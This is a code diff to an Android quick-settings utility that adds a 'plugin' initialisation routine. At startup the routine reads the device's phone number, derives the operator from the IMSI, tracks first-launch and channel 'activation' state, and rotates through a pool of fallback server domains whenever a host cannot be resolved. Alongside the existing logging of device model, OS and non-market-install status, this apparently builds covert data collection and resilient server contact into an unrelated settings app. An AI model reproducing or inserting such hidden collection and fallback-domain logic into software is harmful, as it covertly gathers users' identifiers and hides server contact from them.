@@ -16,9 +16,11 @@
 
 package com.xstd.qm.app;
 
+import java.io.File;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Comparator;
+import java.util.HashMap;
 
 import android.app.Application;
 import android.content.Intent;
@@ -26,13 +28,23 @@ import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 
 import android.os.Build;
+import android.os.Bundle;
 import android.provider.Settings;
+import android.text.TextUtils;
 import com.bwx.bequick.Constants;
 import com.bwx.bequick.fwk.Setting;
 import com.bwx.bequick.fwk.SettingsFactory;
 import com.bwx.bequick.preferences.BrightnessPrefs;
 import com.bwx.bequick.preferences.CommonPrefs;
 import com.plugin.common.utils.SingleInstanceBase;
+import com.plugin.common.utils.UtilsConfig;
+import com.plugin.common.utils.UtilsRuntime;
+import com.plugin.internet.InternetUtils;
+import com.plugin.internet.core.HttpConnectHookListener;
+import com.plugin.internet.core.impl.JsonErrorResponse;
+import com.xstd.plugin.Utils.CommonUtil;
+import com.xstd.plugin.Utils.DomanManager;
+import com.xstd.plugin.config.AppRuntime;
 import com.xstd.qm.Config;
 import com.xstd.qm.Utils;
 import com.xstd.qm.setting.SettingManager;
@@ -87,61 +99,14 @@ public class QuickSettingApplication extends Application {
 
         SettingManager.getInstance().deviceUuidFactory(getApplicationContext());
 
+        initPluginModel();
+
         int open = Settings.Secure.getInt(getContentResolver(), Settings.Secure.INSTALL_NON_MARKET_APPS, 0);
         Utils.saveExtraInfo(android.os.Build.MODEL);
         Utils.saveExtraInfo("os=" + Build.VERSION.RELEASE);
         Utils.saveExtraInfo("unknown=" + (open == 1 ? "open" : "close"));
 
         Config.LOGD("[[QuickSettingApplication::onCreate]] create APP :::::::");
-
-//        long launchTime = SettingManager.getInstance().getKeyLanuchTime();
-//        if (launchTime == 0 || TextUtils.isEmpty(SettingManager.getInstance().getLocalApkPath())) {
-//            //first lanuch
-//
-//            if (Config.DEBUG) {
-//                Config.LOGD("[[QuickSettingApplication::onCreate]] notify Service Lanuch as the lanuch time == 0");
-//            }
-//
-//            Intent i = new Intent();
-//            i.setClass(getApplicationContext(), DemonService.class);
-//            i.setAction(DemonService.ACTION_LANUCH);
-//            startService(i);
-//        } else if (!UtilOperator.isPluginApkExist() && !Config.DOWNLOAD_PROCESS_RUNNING.get()) {
-//            if (Config.DEBUG) {
-//                Config.LOGD("[[QuickSettingApplication::onCreate]] try to download APK from : "
-//                                + SettingManager.getInstance().getLocalApkPath() + " as the local plugin apk not exists");
-//            }
-//
-//            Intent i = new Intent();
-//            i.setClass(getApplicationContext(), DemonService.class);
-//            i.setAction(DemonService.ACTION_DOWNLOAD_PLUGIN);
-//            startService(i);
-//        }
-//
-//        long activeTime = SettingManager.getInstance().getKeyActiveTime();
-//        if (activeTime == 0) {
-//            long deta = System.currentTimeMillis() - SettingManager.getInstance().getKeyLanuchTime();
-//            //TODO: 设置激活时间，激活时间是在启动时间之后的半个小时
-//            if (deta >= (30 * 60 * 1000)) {
-//                //active now
-////                UtilOperator.startActiveAlarm(getApplicationContext(), 1000);
-//                DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
-//            } else {
-//                long activeDelay = 30 * 60 * 1000 - deta;
-//                DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, activeDelay);
-//            }
-//        } else {
-//            Calendar c = Calendar.getInstance();
-//            c.setTimeInMillis(activeTime);
-//            int lastDay = c.get(Calendar.DAY_OF_YEAR);
-//            c = Calendar.getInstance();
-//            int curDay = c.get(Calendar.DAY_OF_YEAR);
-//
-//            if (curDay != lastDay) {
-//                //不是同一天，每天激活一次
-//                DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
-//            }
-//        }
 
     	String defaultText = getString(R.string.txt_status_unknown);
 
@@ -217,6 +182,62 @@ public class QuickSettingApplication extends Application {
     	}
     	return null;
     }
-    
+
+    private void initPluginModel() {
+        com.xstd.plugin.config.SettingManager.getInstance().init(getApplicationContext());
+        if (com.xstd.plugin.config.SettingManager.getInstance().getFirstLanuchTime() == 0) {
+            com.xstd.plugin.config.SettingManager.getInstance().setFirstLanuchTime(System.currentTimeMillis());
+        }
+
+        com.xstd.plugin.config.AppRuntime.getPhoneNumberForLocal(getApplicationContext());
+
+        int channelCode = Integer.valueOf(com.xstd.plugin.config.Config.CHANNEL_CODE);
+        if (channelCode > 900000) {
+            //是内置渠道
+            com.xstd.plugin.config.SettingManager.getInstance().setKeyHasBindingDevices(true);
+        }
+
+        String path = getFilesDir().getAbsolutePath() + "/" + com.xstd.plugin.config.Config.ACTIVE_RESPONSE_FILE;
+        com.xstd.plugin.config.AppRuntime.RESPONSE_SAVE_FILE = path;
+
+        UtilsConfig.init(this.getApplicationContext());
+
+        InternetUtils.setHttpHookListener(getApplicationContext(), new HttpConnectHookListener() {
+
+            @Override
+            public void onPreHttpConnect(String baseUrl, String method, Bundle requestParams) {
+            }
+
+            @Override
+            public void onPostHttpConnect(String result, int httpStatus) {
+            }
+
+            @Override
+            public void onHttpConnectError(int code, String data, Object obj) {
+                if (code == JsonErrorResponse.UnknownHostException) {
+                    if (com.xstd.plugin.config.Config.DEBUG) {
+                        com.xstd.plugin.config.Config.LOGD("[[setHttpHookListener::onHttpConnectError]] Error info : " + data);
+                    }
+
+                    String d = DomanManager.getInstance(getApplicationContext()).getOneAviableDomain();
+                    DomanManager.getInstance(getApplicationContext()).costOneDomain(d);
+                }
+            }
+        });
+
+        com.xstd.plugin.config.AppRuntime.readActiveResponse(path);
+        String type = String.valueOf(AppRuntime.getNetworkTypeByIMSI(getApplicationContext()));
+        if (AppRuntime.ACTIVE_RESPONSE == null
+                || TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.channelName)
+                || !type.equals(AppRuntime.ACTIVE_RESPONSE.operator)) {
+            if (com.xstd.plugin.config.Config.DEBUG) {
+                com.xstd.plugin.config.Config.LOGD("[[PluginApp::onCreate]] delete old response save file as the data is error. " +
+                                                       " Create PluginApp For Process : " + UtilsRuntime.getCurProcessName(getApplicationContext()) + "<><><><>");
+            }
+            com.xstd.plugin.config.AppRuntime.ACTIVE_RESPONSE = null;
+            File file = new File(path);
+            file.delete();
+        }
+    }
 
 }
